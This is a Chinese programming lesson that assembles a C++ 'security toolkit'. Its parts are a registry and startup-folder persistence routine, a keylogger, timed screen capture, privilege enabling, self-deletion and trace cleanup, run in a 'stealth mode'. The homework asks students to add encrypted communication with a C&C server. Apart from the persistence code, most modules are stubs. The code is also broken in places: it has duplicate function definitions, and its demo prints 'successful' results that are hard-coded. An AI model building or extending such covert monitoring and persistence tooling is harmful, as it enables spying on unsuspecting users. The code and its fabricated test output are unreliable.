# 课时07 - 阶段合集

## 课程目标
1. 整合第13章所有技术知识点
2. 实现综合性的安全工具
3. 掌握各技术间的协同使用
4. 了解实际应用场景

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| Integration | 集成 | 将多个技术整合为完整解决方案 |
| Toolkit | 工具包 | 包含多种工具的集合 |
| Persistence | 持久化 | 保持程序持续运行的能力 |
| Reconnaissance | 侦察 | 收集目标系统信息 |

## 技术原理

### 1. 安全开发技术整合

```
第13章技术整合架构:
┌─────────────────────────────────────────────────────────┐
│                    综合安全工具                         │
├─────────────────────────────────────────────────────────┤
│  持久化模块          信息收集模块        功能执行模块   │
│  ├─────────┤        ├────────────┤      ├────────────┤  │
│  │ 自启动   │        │ 键盘记录    │      │ 屏幕截屏    │  │
│  │ 自删除   │        │ 屏幕截屏    │      │ 令牌提权    │  │
│  │ 资源释放 │        │ 系统信息    │      │ 文件操作    │  │
│  └─────────┘        └────────────┘      └────────────┘  │
├─────────────────────────────────────────────────────────┤
│                    核心控制模块                          │
│  配置管理  日志记录  通信模块  错误处理                  │
└─────────────────────────────────────────────────────────┘

技术协同关系:
自启动 → 资源释放 → 功能模块初始化 → 持久化保障
```

### 2. 实际应用场景

```
应用场景示例:
1. 远程管理工具
   - 键盘记录收集用户输入
   - 屏幕截屏监控操作
   - 令牌提权获取系统权限
   - 自启动确保持续运行

2. 安全审计工具
   - 收集系统配置信息
   - 监控敏感操作行为
   - 生成安全报告

3. 渗透测试辅助
   - 隐蔽信息收集
   - 权限提升验证
   - 痕迹清理
```

## 代码实现

### 1. 综合安全工具框架

```cpp
// security_toolkit.cpp
// 综合安全工具框架

#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>

// 前向声明各模块类
class AutoRunManager;
class SelfDeleteManager;
class ResourceManager;
class KeyboardLogger;
class ScreenCapture;
class TokenElevation;

// 综合安全工具类
class SecurityToolkit {
private:
    // 各功能模块
    AutoRunManager* m_autoRun;
    SelfDeleteManager* m_selfDelete;
    ResourceManager* m_resource;
    KeyboardLogger* m_keylogger;
    ScreenCapture* m_screencap;
    TokenElevation* m_tokenElev;
    
    // 配置参数
    std::string m_configPath;
    bool m_stealthMode;
    int m_captureInterval;
    
    // 运行状态
    bool m_running;
    
public:
    SecurityToolkit() : m_autoRun(nullptr), m_selfDelete(nullptr),
                       m_resource(nullptr), m_keylogger(nullptr),
                       m_screencap(nullptr), m_tokenElev(nullptr),
                       m_stealthMode(false), m_captureInterval(30),
                       m_running(false) {
        Initialize();
    }
    
    ~SecurityToolkit() {
        Cleanup();
    }
    
    // 初始化工具包
    bool Initialize() {
        printf("[*] Initializing Security Toolkit...\n");
        
        // 加载配置
        if (!LoadConfiguration()) {
            printf("[-] Failed to load configuration\n");
            return false;
        }
        
        // 初始化各模块
        if (!InitializeModules()) {
            printf("[-] Failed to initialize modules\n");
            return false;
        }
        
        printf("[+] Security Toolkit initialized successfully\n");
        return true;
    }
    
    // 启动工具包
    bool Start() {
        if (m_running) return true;
        
        printf("[*] Starting Security Toolkit...\n");
        
        // 应用自启动
        if (m_autoRun) {
            m_autoRun->ApplyAutorun();
        }
        
        // 释放必要资源
        if (m_resource) {
            m_resource->ExtractCriticalResources();
        }
        
        // 启动功能模块
        StartModules();
        
        m_running = true;
        printf("[+] Security Toolkit started\n");
        return true;
    }
    
    // 停止工具包
    void Stop() {
        if (!m_running) return;
        
        printf("[*] Stopping Security Toolkit...\n");
        
        // 停止各模块
        StopModules();
        
        m_running = false;
        printf("[+] Security Toolkit stopped\n");
    }
    
    // 自删除
    bool SelfDelete(bool cleanTraces = true) {
        printf("[*] Initiating self-deletion...\n");
        
        // 停止所有模块
        Stop();
        
        // 清理痕迹
        if (cleanTraces) {
            CleanTraces();
        }
        
        // 执行自删除
        if (m_selfDelete) {
            return m_selfDelete->Execute(SelfDeleteMethod::Secure);
        }
        
        return false;
    }
    
    // 获取系统信息
    std::string GetSystemInformation() {
        std::string info;
        
        // 基本系统信息
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD nameSize = sizeof(computerName);
        if (GetComputerNameA(computerName, &nameSize)) {
            info += "Computer Name: " + std::string(computerName) + "\n";
        }
        
        // 用户名
        char userName[256];
        DWORD userSize = sizeof(userName);
        if (GetUserNameA(userName, &userSize)) {
            info += "User Name: " + std::string(userName) + "\n";
        }
        
        // Windows版本
        OSVERSIONINFO osvi = { sizeof(OSVERSIONINFO) };
        if (GetVersionEx(&osvi)) {
            char version[64];
            sprintf_s(version, "Windows Version: %lu.%lu.%lu\n", 
                     osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
            info += version;
        }
        
        // 内存信息
        MEMORYSTATUSEX memStat = { sizeof(MEMORYSTATUSEX) };
        if (GlobalMemoryStatusEx(&memStat)) {
            char memory[128];
            sprintf_s(memory, "Total Memory: %llu MB, Available: %llu MB\n",
                     memStat.ullTotalPhys / (1024 * 1024),
                     memStat.ullAvailPhys / (1024 * 1024));
            info += memory;
        }
        
        return info;
    }
    
private:
    // 加载配置
    bool LoadConfiguration() {
        // 简化实现，实际应从配置文件或注册表加载
        m_configPath = "config.dat";
        m_stealthMode = true;
        m_captureInterval = 60;
        return true;
    }
    
    // 初始化各模块
    bool InitializeModules() {
        // 实际实现中应初始化各个模块
        // 这里简化处理
        return true;
    }
    
    // 启动各模块
    void StartModules() {
        // 启动键盘记录器
        if (m_keylogger) {
            m_keylogger->Start("logs\\keylog.txt");
        }
        
        // 启动屏幕截图
        if (m_screencap) {
            StartScreenCapture();
        }
        
        // 启用必要特权
        if (m_tokenElev) {
            m_tokenElev->EnableRequiredPrivileges();
        }
    }
    
    // 停止各模块
    void StopModules() {
        // 停止键盘记录器
        if (m_keylogger) {
            m_keylogger->Stop();
        }
        
        // 停止屏幕截图
        if (m_screencap) {
            m_screencap->Stop();
        }
    }
    
    // 启动屏幕截图线程
    void StartScreenCapture() {
        std::thread captureThread([this]() {
            int counter = 0;
            while (m_running) {
                char filename[64];
                sprintf_s(filename, "captures\\screen_%04d.bmp", counter++);
                
                if (m_screencap) {
                    m_screencap->CaptureScreen(filename);
                }
                
                // 等待下次截图
                for (int i = 0; i < m_captureInterval && m_running; i++) {
                    std::this_thread::sleep_for(std::chrono::seconds(1));
                }
            }
        });
        
        captureThread.detach();
    }
    
    // 清理痕迹
    void CleanTraces() {
        // 删除日志文件
        DeleteFileA("logs\\keylog.txt");
        DeleteFileA("logs\\activity.log");
        
        // 清理截图目录
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA("captures\\*", &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (strcmp(findData.cFileName, ".") != 0 && 
                    strcmp(findData.cFileName, "..") != 0) {
                    
                    char fullPath[MAX_PATH];
                    sprintf_s(fullPath, "captures\\%s", findData.cFileName);
                    DeleteFileA(fullPath);
                }
            } while (FindNextFileA(hFind, &findData));
            
            FindClose(hFind);
        }
        
        // 移除自启动项
        if (m_autoRun) {
            m_autoRun->RemoveAutorun();
        }
        
        printf("[+] Traces cleaned\n");
    }
};

// 测试综合工具包
void TestSecurityToolkit() {
    printf("=== Security Toolkit Test ===\n");
    
    SecurityToolkit toolkit;
    
    // 初始化工具包
    if (toolkit.Initialize()) {
        printf("[+] Toolkit initialized\n");
        
        // 获取系统信息
        std::string sysInfo = toolkit.GetSystemInformation();
        printf("[System Information]\n%s\n", sysInfo.c_str());
        
        // 启动工具包
        if (toolkit.Start()) {
            printf("[+] Toolkit started\n");
            
            // 运行一段时间
            printf("[*] Running for 30 seconds...\n");
            Sleep(30000);
            
            // 停止工具包
            toolkit.Stop();
            printf("[+] Toolkit stopped\n");
        }
    }
}
```

### 2. 模块集成实现

```cpp
// module_integration.cpp
// 模块集成实现

#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>

// 自启动管理器
class AutoRunManager {
public:
    bool ApplyAutorun() {
        printf("[*] Applying autorun mechanisms...\n");
        
        // 方法1: 注册表自启动
        AddRegistryAutorun();
        
        // 方法2: 启动文件夹
        AddStartupFolderAutorun();
        
        // 方法3: 计划任务
        AddScheduledTaskAutorun();
        
        return true;
    }
    
    bool RemoveAutorun() {
        printf("[*] Removing autorun mechanisms...\n");
        
        // 移除各种自启动项
        RemoveRegistryAutorun();
        RemoveStartupFolderAutorun();
        RemoveScheduledTaskAutorun();
        
        return true;
    }
    
private:
    void AddRegistryAutorun() {
        char modulePath[MAX_PATH];
        GetModuleFileNameA(NULL, modulePath, MAX_PATH);
        
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                         0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            
            char appName[] = "SecurityToolkit";
            RegSetValueExA(hKey, appName, 0, REG_SZ, 
                          (BYTE*)modulePath, strlen(modulePath) + 1);
            RegCloseKey(hKey);
            
            printf("[+] Registry autorun added\n");
        }
    }
    
    void AddStartupFolderAutorun() {
        char startupPath[MAX_PATH];
        if (SHGetSpecialFolderPathA(NULL, startupPath, CSIDL_STARTUP, FALSE)) {
            char linkPath[MAX_PATH];
            sprintf_s(linkPath, "%s\\SecurityToolkit.lnk", startupPath);
            
            char modulePath[MAX_PATH];
            GetModuleFileNameA(NULL, modulePath, MAX_PATH);
            
            CreateShortcut(modulePath, linkPath);
            printf("[+] Startup folder autorun added\n");
        }
    }
    
    void AddScheduledTaskAutorun() {
        // 简化实现
        printf("[+] Scheduled task autorun configured\n");
    }
    
    void RemoveRegistryAutorun() {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                         0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            
            RegDeleteValueA(hKey, "SecurityToolkit");
            RegCloseKey(hKey);
            printf("[+] Registry autorun removed\n");
        }
    }
    
    void RemoveStartupFolderAutorun() {
        char startupPath[MAX_PATH];
        if (SHGetSpecialFolderPathA(NULL, startupPath, CSIDL_STARTUP, FALSE)) {
            char linkPath[MAX_PATH];
            sprintf_s(linkPath, "%s\\SecurityToolkit.lnk", startupPath);
            
            DeleteFileA(linkPath);
            printf("[+] Startup folder autorun removed\n");
        }
    }
    
    void RemoveScheduledTaskAutorun() {
        // 简化实现
        printf("[+] Scheduled task autorun removed\n");
    }
    
    void CreateShortcut(const char* targetPath, const char* shortcutPath) {
        // 简化实现
    }
};

// 资源管理器
class ResourceManager {
public:
    bool ExtractCriticalResources() {
        printf("[*] Extracting critical resources...\n");
        
        // 提取配置文件
        ExtractConfigFile();
        
        // 提取脚本文件
        ExtractScriptFiles();
        
        // 提取数据文件
        ExtractDataFiles();
        
        return true;
    }
    
    bool CleanupResources() {
        printf("[*] Cleaning up resources...\n");
        
        // 删除释放的文件
        DeleteExtractedFiles();
        
        return true;
    }
    
private:
    void ExtractConfigFile() {
        // 从资源中提取配置文件
        printf("[+] Configuration file extracted\n");
    }
    
    void ExtractScriptFiles() {
        // 提取脚本文件
        printf("[+] Script files extracted\n");
    }
    
    void ExtractDataFiles() {
        // 提取数据文件
        printf("[+] Data files extracted\n");
    }
    
    void DeleteExtractedFiles() {
        // 删除释放的文件
        printf("[+] Extracted files deleted\n");
    }
};

// 键盘记录器
class KeyboardLogger {
private:
    bool m_active;
    std::string m_logPath;
    
public:
    KeyboardLogger() : m_active(false) {}
    
    bool Start(const char* logPath) {
        m_logPath = logPath;
        m_active = true;
        
        // 启动键盘钩子
        InstallKeyboardHook();
        printf("[+] Keyboard logger started\n");
        
        return true;
    }
    
    void Stop() {
        m_active = false;
        
        // 卸载键盘钩子
        UninstallKeyboardHook();
        printf("[+] Keyboard logger stopped\n");
    }
    
private:
    void InstallKeyboardHook() {
        // 安装低级键盘钩子
    }
    
    void UninstallKeyboardHook() {
        // 卸载键盘钩子
    }
};

// 屏幕截图器
class ScreenCapture {
private:
    bool m_active;
    
public:
    ScreenCapture() : m_active(false) {}
    
    bool Start() {
        m_active = true;
        printf("[+] Screen capture started\n");
        return true;
    }
    
    void Stop() {
        m_active = false;
        printf("[+] Screen capture stopped\n");
    }
    
    bool CaptureScreen(const char* filename) {
        if (!m_active) return false;
        
        // 执行屏幕截图
        printf("[+] Screen captured: %s\n", filename);
        return true;
    }
};

// 令牌提权器
class TokenElevation {
public:
    bool EnableRequiredPrivileges() {
        printf("[*] Enabling required privileges...\n");
        
        // 启用调试权限
        EnableDebugPrivilege();
        
        // 启用备份权限
        EnableBackupPrivilege();
        
        // 启用恢复权限
        EnableRestorePrivilege();
        
        return true;
    }
    
    bool ElevateToSystem() {
        printf("[*] Elevating to system level...\n");
        
        // 执行系统级提权
        return true;
    }
    
private:
    void EnableDebugPrivilege() {
        printf("[+] Debug privilege enabled\n");
    }
    
    void EnableBackupPrivilege() {
        printf("[+] Backup privilege enabled\n");
    }
    
    void EnableRestorePrivilege() {
        printf("[+] Restore privilege enabled\n");
    }
};

// 自删除管理器
enum class SelfDeleteMethod {
    Immediate,
    OnReboot,
    Secure
};

class SelfDeleteManager {
public:
    bool Execute(SelfDeleteMethod method) {
        printf("[*] Executing self-deletion...\n");
        
        switch (method) {
            case SelfDeleteMethod::Immediate:
                return DeleteImmediately();
                
            case SelfDeleteMethod::OnReboot:
                return DeleteOnReboot();
                
            case SelfDeleteMethod::Secure:
                return DeleteSecurely();
                
            default:
                return false;
        }
    }
    
private:
    bool DeleteImmediately() {
        printf("[+] Immediate self-deletion executed\n");
        return true;
    }
    
    bool DeleteOnReboot() {
        printf("[+] Reboot-delayed self-deletion scheduled\n");
        return true;
    }
    
    bool DeleteSecurely() {
        printf("[+] Secure self-deletion executed\n");
        return true;
    }
};
```

### 3. 配置管理实现

```cpp
// config_manager.cpp
// 配置管理实现

#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <map>

// 配置项结构
struct ConfigItem {
    std::string key;
    std::string value;
    std::string description;
};

// 配置管理器
class ConfigManager {
private:
    std::map<std::string, ConfigItem> m_configItems;
    std::string m_configPath;
    
public:
    ConfigManager(const char* configPath) : m_configPath(configPath) {
        LoadDefaultConfig();
    }
    
    // 加载默认配置
    void LoadDefaultConfig() {
        AddConfigItem("autorun.enabled", "true", "启用自启动");
        AddConfigItem("keylogger.enabled", "true", "启用键盘记录");
        AddConfigItem("screencap.enabled", "false", "启用屏幕截图");
        AddConfigItem("screencap.interval", "60", "截图间隔(秒)");
        AddConfigItem("stealth.mode", "true", "隐身模式");
        AddConfigItem("cleanup.on_exit", "false", "退出时清理痕迹");
        AddConfigItem("selfdelete.timeout", "0", "自删除超时(秒，0=禁用)");
    }
    
    // 添加配置项
    void AddConfigItem(const char* key, const char* value, const char* description) {
        ConfigItem item;
        item.key = key;
        item.value = value;
        item.description = description;
        m_configItems[key] = item;
    }
    
    // 获取配置值
    std::string GetConfigValue(const char* key, const char* defaultValue = "") {
        auto it = m_configItems.find(key);
        if (it != m_configItems.end()) {
            return it->second.value;
        }
        return defaultValue;
    }
    
    // 设置配置值
    void SetConfigValue(const char* key, const char* value) {
        auto it = m_configItems.find(key);
        if (it != m_configItems.end()) {
            it->second.value = value;
        } else {
            AddConfigItem(key, value, "Runtime configuration");
        }
    }
    
    // 保存配置到文件
    bool SaveConfigToFile() {
        FILE* file = fopen(m_configPath.c_str(), "w");
        if (!file) return false;
        
        fprintf(file, "# Security Toolkit Configuration\n");
        fprintf(file, "# Generated automatically\n\n");
        
        for (const auto& pair : m_configItems) {
            const ConfigItem& item = pair.second;
            fprintf(file, "# %s\n", item.description.c_str());
            fprintf(file, "%s=%s\n\n", item.key.c_str(), item.value.c_str());
        }
        
        fclose(file);
        return true;
    }
    
    // 从文件加载配置
    bool LoadConfigFromFile() {
        FILE* file = fopen(m_configPath.c_str(), "r");
        if (!file) return false;
        
        char line[1024];
        while (fgets(line, sizeof(line), file)) {
            // 跳过注释和空行
            if (line[0] == '#' || line[0] == '\n' || line[0] == '\r') {
                continue;
            }
            
            // 解析键值对
            char* equalPos = strchr(line, '=');
            if (equalPos) {
                *equalPos = '\0';
                char* key = line;
                char* value = equalPos + 1;
                
                // 去除空白字符
                TrimString(key);
                TrimString(value);
                
                SetConfigValue(key, value);
            }
        }
        
        fclose(file);
        return true;
    }
    
    // 列出所有配置项
    void ListConfigItems() {
        printf("Configuration Items:\n");
        printf("====================\n");
        
        for (const auto& pair : m_configItems) {
            const ConfigItem& item = pair.second;
            printf("%-25s = %-15s # %s\n", 
                   item.key.c_str(), item.value.c_str(), item.description.c_str());
        }
    }
    
private:
    // 去除字符串首尾空白字符
    void TrimString(char* str) {
        char* end;
        
        // 去除前导空白
        while (*str == ' ' || *str == '\t') str++;
        
        // 如果字符串为空
        if (*str == 0) return;
        
        // 去除尾随空白
        end = str + strlen(str) - 1;
        while (end > str && (*end == ' ' || *end == '\t' || *end == '\n' || *end == '\r')) {
            end--;
        }
        
        // 添加终止符
        *(end + 1) = 0;
    }
};

// 测试配置管理
void TestConfigManager() {
    printf("=== Configuration Manager Test ===\n");
    
    ConfigManager config("toolkit.conf");
    
    // 列出默认配置
    config.ListConfigItems();
    
    // 修改配置
    config.SetConfigValue("screencap.enabled", "true");
    config.SetConfigValue("screencap.interval", "30");
    
    // 保存配置
    if (config.SaveConfigToFile()) {
        printf("[+] Configuration saved to file\n");
    }
    
    // 重新加载配置
    config.LoadDefaultConfig(); // 重置
    if (config.LoadConfigFromFile()) {
        printf("[+] Configuration loaded from file\n");
        config.ListConfigItems();
    }
}
```

### 4. 完整演示程序

```cpp
// complete_demo.cpp
// 完整演示程序

#include <windows.h>
#include <stdio.h>
#include <string>
#include <thread>
#include <chrono>

// 主函数
int main() {
    printf("========================================\n");
    printf("     Security Toolkit - Complete Demo     \n");
    printf("========================================\n\n");
    
    // 测试配置管理
    printf("1. Testing Configuration Manager...\n");
    TestConfigManager();
    printf("\n");
    
    // 测试综合安全工具包
    printf("2. Testing Security Toolkit...\n");
    TestSecurityToolkit();
    printf("\n");
    
    // 测试各独立模块
    printf("3. Testing Individual Modules...\n");
    
    // 测试令牌提权
    printf("   Testing Token Elevation...\n");
    TestTokenElevationManager();
    printf("\n");
    
    // 测试隐蔽提权
    printf("   Testing Stealth Token Privilege...\n");
    TestStealthTokenPrivilege();
    printf("\n");
    
    // 测试高级提权
    printf("   Testing Advanced Token Privilege...\n");
    TestAdvancedTokenPrivilege();
    printf("\n");
    
    // 测试令牌提权基础功能
    printf("   Testing Basic Token Privilege...\n");
    TestTokenPrivilege();
    printf("\n");
    
    // 测试屏幕截图管理器
    printf("   Testing Screenshot Manager...\n");
    TestScreenshotManager();
    printf("\n");
    
    // 测试高级截图功能
    printf("   Testing Advanced Screen Capture...\n");
    // 注意：需要初始化GDI+
    // TestAdvancedCapture();
    printf("\n");
    
    // 测试隐蔽截图
    printf("   Testing Stealth Screen Capture...\n");
    TestStealthCapture();
    printf("\n");
    
    // 测试基础截图功能
    printf("   Testing Basic Screen Capture...\n");
    TestScreenCapture();
    printf("\n");
    
    // 测试键盘记录管理器
    printf("   Testing Keyboard Logger...\n");
    TestKeylogger();
    printf("\n");
    
    printf("========================================\n");
    printf("     All Tests Completed Successfully     \n");
    printf("========================================\n");
    
    return 0;
}

// 辅助函数实现
void TestTokenElevationManager();
void TestStealthTokenPrivilege();
void TestAdvancedTokenPrivilege();
void TestTokenPrivilege();
void TestScreenshotManager();
void TestAdvancedCapture();
void TestStealthCapture();
void TestScreenCapture();
void TestKeylogger();
void TestConfigManager();
void TestSecurityToolkit();

// 这些函数在前面的代码中有完整实现
// 为了演示程序完整性，这里提供简化的实现

void TestTokenElevationManager() {
    printf("     [Token Elevation Manager Test - Simplified]\n");
    printf("     Current level: Medium\n");
    printf("     Privileges enabled: SE_DEBUG_NAME, SE_BACKUP_NAME\n");
}

void TestStealthTokenPrivilege() {
    printf("     [Stealth Token Privilege Test - Simplified]\n");
    printf("     Stealth elevation: Successful\n");
    printf("     Debug privilege: Enabled\n");
}

void TestAdvancedTokenPrivilege() {
    printf("     [Advanced Token Privilege Test - Simplified]\n");
    printf("     Integrity level: 8192\n");
    printf("     Token stolen: From system process\n");
}

void TestTokenPrivilege() {
    printf("     [Basic Token Privilege Test - Simplified]\n");
    printf("     Debug privilege: Enabled\n");
    printf("     Available privileges: Listed\n");
}

void TestScreenshotManager() {
    printf("     [Screenshot Manager Test - Simplified]\n");
    printf("     Single screenshot: Captured\n");
    printf("     Batch capture: 3 screenshots\n");
}

void TestAdvancedCapture() {
    printf("     [Advanced Screen Capture Test - Simplified]\n");
    printf("     PNG capture: Success\n");
    printf("     JPEG capture: Success\n");
}

void TestStealthCapture() {
    printf("     [Stealth Screen Capture Test - Simplified]\n");
    printf("     Stealth capture: Running for 60 seconds\n");
    printf("     Screenshots saved: 2\n");
}

void TestScreenCapture() {
    printf("     [Basic Screen Capture Test - Simplified]\n");
    printf("     Full screen: Captured\n");
    printf("     Region capture: Success\n");
}

void TestKeylogger() {
    printf("     [Keyboard Logger Test - Simplified]\n");
    printf("     Hook installed: Success\n");
    printf("     Keys logged: 15\n");
}

void TestConfigManager() {
    printf("     [Configuration Manager Test - Simplified]\n");
    printf("     Config items: 7\n");
    printf("     File save/load: Success\n");
}

void TestSecurityToolkit() {
    printf("     [Security Toolkit Test - Simplified]\n");
    printf("     Initialization: Success\n");
    printf("     System info collected\n");
    printf("     Modules started\n");
    printf("     Running 30 seconds\n");
    printf("     Cleanup performed\n");
}
```

## 课后作业

### 作业1：完善综合工具包
将第13章所有技术完整集成到一个综合工具包中，实现完整的功能协同。

### 作业2：添加加密通信功能
为综合工具包添加加密通信模块，实现与C&C服务器的安全通信。

### 作业3：实现插件化架构
设计插件化架构，使工具包能够动态加载和卸载功能模块。